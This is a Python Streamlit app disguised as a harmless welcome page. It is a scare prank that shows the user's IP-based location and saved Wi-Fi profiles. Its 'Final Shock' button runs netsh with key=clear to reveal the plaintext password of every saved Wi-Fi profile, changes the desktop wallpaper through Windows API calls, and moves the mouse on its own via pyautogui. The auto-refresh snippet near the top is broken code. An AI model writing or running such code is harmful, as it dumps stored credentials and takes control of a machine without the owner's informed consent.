import streamlit as st
import geocoder
import subprocess
import ctypes
import time
import os
import re
from PIL import Image
import random
import threading

# --- Streamlit Page Settings ---
st.set_page_config(page_title="Hi! There", layout="centered")
st.title("🌐 Welcome to Stimulate")

# --- Keep refreshing the page every 30 seconds to simulate "never closing" ---
st_autorefresh = st.experimental_rerun(lambda: True)
if st_autorefresh():
    st.experimental_rerun()

# --- Fetch IP and Location Info ---
g = geocoder.ip('me')
location_data = g.geojson['features'][0]['properties'] if g and g.ok else {}
ip_address = g.ip if g and g.ok else None

# --- First Innocent Message ---
st.markdown("## 😎 Welcome! Nothing special here...")
st.markdown("### 🧐 Scroll down to see something crazy... 👀")
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)

# --- Surprise Section (IP and Location) ---
st.subheader("🎯 Surprise! Here's What We Found:")

if ip_address:
    st.success(f"**Your IP Address is:** `{ip_address}`")
else:
    st.error("❌ Could not retrieve your IP address.")

if location_data:
    st.write(f"**City:** {location_data.get('city', 'Unknown')}")
    st.write(f"**Region:** {location_data.get('region', 'Unknown')}")
    st.write(f"**Country:** {location_data.get('country', 'Unknown')}")
    st.write(f"**Latitude:** {location_data.get('lat', 'Unknown')}")
    st.write(f"**Longitude:** {location_data.get('lng', 'Unknown')}")
else:
    st.warning("Location details not available.")

# --- More Scroll Down Space ---
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 📡 Scroll down to also see your Wi-Fi History...")

# --- Wi-Fi History Section ---
st.subheader("🔍 Your Wi-Fi History:")
try:
    result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True)
    if result.stdout:
        st.write("Here are the saved Wi-Fi profiles on your system:")
        st.code(result.stdout)
    else:
        st.warning("No Wi-Fi profiles found or access denied.")
except Exception as e:
    st.error(f"❌ An error occurred while fetching Wi-Fi details: {e}")

# --- Scroll More ---
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 🔥 Scroll down even more for the final surprise!")

# --- Check for graphical environment ---
has_display = (os.name != "posix") or ("DISPLAY" in os.environ)

# --- Mouse Prank Replacement ---
def fake_mouse_prank(duration=10):
    """
    Instead of moving mouse (not supported in cloud),
    randomly changes background color and prints creepy messages.
    """
    end_time = time.time() + duration
    colors = ["#0a0a0a", "#1a0000", "#330000", "#4d0000", "#660000"]
    while time.time() < end_time:
        color = random.choice(colors)
        st.markdown(f"""
            <style>
            .stApp {{
                background-color: {color} !important;
                transition: background-color 0.5s ease;
            }}
            </style>
        """, unsafe_allow_html=True)
        st.markdown(f"### 👻 The ghost flickers... {random.choice(['👁️', '💀', '🔥'])}")
        time.sleep(0.7)

# --- Final Shock Button ---
if st.button("👻 Click Here for the Final Shock!", key="final_shock_button"):
    st.subheader("🔐 Saved Wi-Fi Profiles & Passwords:")

    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles_output = result.stdout
        profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)

        if profiles:
            for profile in profiles:
                profile = profile.strip()
                password_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True, text=True
                )
                password_output = password_result.stdout
                password_search = re.search(r"Key Content\s*:\s(.*)", password_output)
                password = password_search.group(1) if password_search else "🔒 Not Found / Secured"
                st.write(f"📶 **{profile}** — 🔑 `{password}`")
        else:
            st.warning("No Wi-Fi profiles found.")
    except Exception as e:
        st.error(f"❌ Something went wrong while fetching Wi-Fi passwords: {e}")

    # --- Wallpaper Change ---
    try:
        black_wallpaper_path = os.path.join(os.getcwd(), "black.jpg")
        if not os.path.exists(black_wallpaper_path):
            black_img = Image.new('RGB', (1920, 1080), color=(0, 0, 0))
            black_img.save(black_wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, black_wallpaper_path, 3)
    except Exception as e:
        st.warning(f"⚠️ Could not change wallpaper: {e}")

    # --- Ghost Flicker Placeholder ---
    try:
        st.markdown("### 👁️ Screen glitch initiated...")
        for i in range(3):
            st.markdown(f"👻 Flicker {i+1}")
            time.sleep(1.2)
    except Exception as e:
        st.error(f"💀 Visual effect failed: {e}")

    # --- Run prank safely ---
    try:
        st.markdown("### 🖱️ Your mouse has been possessed... 😈")
        if has_display:
            import pyautogui as pag
            # Use real mouse prank on local machine only
            def mouse_prank_safe(duration=10):
                end_time = time.time() + duration
                while time.time() < end_time:
                    x = random.randint(600, 700)
                    y = random.randint(200, 600)
                    pag.moveTo(x, y, duration=0.5)
            prank_thread = threading.Thread(target=mouse_prank_safe)
            prank_thread.start()
        else:
            # Cloud or headless fallback: fake prank inside Streamlit
            fake_mouse_prank()
    except Exception as e:
        st.error(f"❌ Mouse prank failed: {e}")
